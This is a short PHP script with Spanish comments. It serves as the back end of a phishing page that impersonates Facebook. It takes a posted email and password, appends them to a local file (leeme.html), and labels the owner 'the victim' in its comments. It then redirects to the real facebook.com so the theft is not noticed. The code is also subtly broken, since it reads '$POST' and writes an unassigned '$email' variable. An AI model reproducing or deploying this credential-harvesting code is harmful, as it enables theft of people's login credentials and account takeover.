<?
#variable.php
//Asigna el valor de las variables del usuario y contraseña
$usuario=$POST['email'];
$contraseña=$_POST['pass'];

//Asigna el valor a la variable donde se guarda el correo y la cotraseña de la victima
$guardame=fopen('leeme.html','a+');
fwrite($guardame,
"<br/><b>Email:</b>".$email.
"<br/><b>Contrasena:</b>".$contraseña." ");
fclose($guardame);

//Redirecciona a la web original (facebook)
echo "<meta http-equiv='refresh' content='1;url=http://www.facebook.com'>"
?>